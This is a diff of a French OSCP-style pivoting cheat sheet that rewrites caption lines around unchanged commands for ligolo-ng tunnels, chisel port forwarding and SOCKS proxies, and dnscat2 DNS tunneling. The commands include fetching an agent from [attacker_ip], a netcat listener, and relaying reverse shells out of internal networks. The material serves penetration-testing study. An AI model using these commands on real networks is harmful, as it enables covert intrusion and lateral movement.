@@ -20,7 +20,7 @@ Configurer et comprendre les chemins de communication réseau.
 `/24`  
 
 
-Commande `ip` pour la rubrique « Tunnel simple ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>
 
 ```bash
 sudo ip tuntap add user [kali_user] mode tun ligolo
@@ -29,7 +29,7 @@ sudo ip link set ligolo up
 ```
 
 
-Commande `./ligolo_proxy_linux` pour la rubrique « Tunnel simple ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ./ligolo_proxy_linux.</p>
 
 ```bash
 # The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.
@@ -39,14 +39,14 @@ Commande `./ligolo_proxy_linux` pour la rubrique « Tunnel simple ».
 ```
 
 
-Commande `iwr` pour la rubrique « Tunnel simple ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>
 
 ```powershell
 iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe
 ```
 
 
-Commande `./ligolo_agent_windows.exe` pour la rubrique « Tunnel simple ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ./ligolo_agent_windows.exe.</p>
 
 ```powershell
 # The port is the default one, we could also change it if needed.
@@ -56,7 +56,7 @@ Commande `./ligolo_agent_windows.exe` pour la rubrique « Tunnel simple ».
 ```
 
 
-Commande `ip` pour la rubrique « Tunnel simple ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>
 
 ```bash
 # Run this command in other terminal that from the one where ligolo proxy is running
@@ -67,7 +67,7 @@ ip route list
 ```
 
 
-Exemple technique pour la rubrique « Tunnel simple ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Tunnel simple ».</p>
 
 ```bash
 # Run this commands in the ligolo proxy terminal
@@ -85,7 +85,7 @@ Configurer et comprendre les chemins de communication réseau.
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png)
 
 
-Commande `ip` pour la rubrique « Double tunnel ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>
 
 ```bash
 sudo ip tuntap add user [kali_user] mode tun ligolo_double
@@ -94,7 +94,7 @@ sudo ip link set ligolo_double up
 ```
 
 
-Commande `listener_add` pour la rubrique « Double tunnel ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil listener_add.</p>
 
 ```bash
 # The next step is to add a listener on port 11601 to our existing Ligolo session and redirect it to our machine. 
@@ -107,7 +107,7 @@ listener_list
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_01.png)
 
 
-Commande `./agent.exe` pour la rubrique « Double tunnel ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ./agent.exe.</p>
 
 ```powershell
 # Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine
@@ -119,7 +119,7 @@ Commande `./agent.exe` pour la rubrique « Double tunnel ».
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_03.png)
 
 
-Commande `ip` pour la rubrique « Double tunnel ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>
 
 ```bash
 # Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.
@@ -138,7 +138,7 @@ sudo ip add route <New_Network> dev ligolo_double
 Vérifier les ports et les services de la cible autorisée.
 
 
-Commande `ip` pour la rubrique « Local Redirection de ports ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>
 
 ```bash
 # Add a special hardcoded IP for local port forwarding.
@@ -150,7 +150,7 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 `240.0.0.1/32`  
 
 
-Commande `dev` pour la rubrique « Local Redirection de ports ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dev.</p>
 
 ```text
 dev ligolo
@@ -161,7 +161,7 @@ dev ligolo
 `240.0.0.1`  
 
 
-Exemple technique pour la rubrique « Local Redirection de ports ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Local Redirection de ports ».</p>
 
 ```bash
 ┌──(kali㉿Kali)-[~]  
@@ -181,14 +181,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ### Reverse Shells From Internal Networks
 
 
-Tester ou établir une connexion réseau avec Netcat.
+<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>
 
 ```bash
 nc -nvlp [kali_port]
 ```
 
 
-Commande `listener_add` pour la rubrique « Reverse Shells From Internal Networks ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil listener_add.</p>
 
 ```bash
 listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
@@ -201,7 +201,7 @@ listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
 `msfvenom`  
 
 
-Exemple technique pour la rubrique « Reverse Shells From Internal Networks ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Reverse Shells From Internal Networks ».</p>
 
 ```bash
 [command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
@@ -217,7 +217,7 @@ Exemple technique pour la rubrique « Reverse Shells From Internal Networks ».
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
-Commande `listener_add` pour la rubrique « Transfert de fichiers From Internal Networks ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil listener_add.</p>
 
 ```bash
 listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
@@ -226,7 +226,7 @@ listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_07.png)
 
 
-Commande `python3` pour la rubrique « Transfert de fichiers From Internal Networks ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 python3 -m http.server [kali_port]
@@ -235,7 +235,7 @@ python3 -m http.server [kali_port]
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_08.png)
 
 
-Commande `invoke-webrequest` pour la rubrique « Transfert de fichiers From Internal Networks ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil invoke-webrequest.</p>
 
 ```powershell
 Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]
@@ -254,7 +254,7 @@ Examiner les entrées et les réponses de l'application web.
 Vérifier les ports et les services de la cible autorisée.
 
 
-Commande `chisel` pour la rubrique « Redirection de ports ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>
 
 ```bash
 # In remote machine
@@ -270,7 +270,7 @@ chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
 Vérifier les ports et les services de la cible autorisée.
 
 
-Commande `chisel` pour la rubrique « Redirection inversée de ports ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>
 
 ```bash
 # In local machine
@@ -283,7 +283,7 @@ chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl http://localhost:<LOCAL_FORWARD_PORT>
@@ -297,7 +297,7 @@ curl http://localhost:<LOCAL_FORWARD_PORT>
 Configurer et comprendre les chemins de communication réseau.
 
 
-Commande `chisel` pour la rubrique « Proxy SOCKS dynamique ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>
 
 ```bash
 # In remote
@@ -314,7 +314,7 @@ chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks
 `/etc/proxychains.conf`  
 
 
-Commande `...` pour la rubrique « Proxy SOCKS dynamique ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ....</p>
 
 ```bash
 # Comment out the line of "socks4"
@@ -330,7 +330,7 @@ socks5 127.0.0.1 <LOCAL_PORT>
 Configurer et comprendre les chemins de communication réseau.
 
 
-Commande `chisel` pour la rubrique « Proxy SOCKS inverse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>
 
 ```bash
 # In local machine
@@ -347,7 +347,7 @@ chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks
 `/etc/proxychains.conf`  
 
 
-Commande `...` pour la rubrique « Proxy SOCKS inverse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ....</p>
 
 ```bash
 # /etc/proxychains.conf
@@ -356,7 +356,7 @@ socks5 127.0.0.1 <REMOTE_PORT>
 ```
 
 
-Commande `proxychains` pour la rubrique « Proxy SOCKS inverse ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil proxychains.</p>
 
 ```bash
 proxychains nmap localhost
@@ -372,7 +372,7 @@ Interroger les enregistrements DNS et identifier les services associés.
 `dnscat2`  
 
 
-Commande `dnscat2-server` pour la rubrique « Dnscat2 (DNS Tunneling) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dnscat2-server.</p>
 
 ```bash
 # Replace [domain] with the chosen domain
@@ -384,7 +384,7 @@ dnscat2-server [domain]
 `dnscat2`  
 
 
-Commande `./dnscat` pour la rubrique « Dnscat2 (DNS Tunneling) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ./dnscat.</p>
 
 ```bash
 # With domain
@@ -399,7 +399,7 @@ Commande `./dnscat` pour la rubrique « Dnscat2 (DNS Tunneling) ».
 `dnscat2`  
 
 
-Commande `dnscat2` pour la rubrique « Dnscat2 (DNS Tunneling) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil dnscat2.</p>
 
 ```bash
 dnscat2> windows
@@ -411,7 +411,7 @@ dnscat2> window -i [session_id]
 `dnscat2`  
 
 
-Commande `command` pour la rubrique « Dnscat2 (DNS Tunneling) ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil command.</p>
 
 ```bash
 command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]
@@ -422,7 +422,7 @@ command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_por
 `dnscat2`  
 
 
-Énumérer les informations SMB ou RPC.
+<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
 
 ```bash
 # Example command
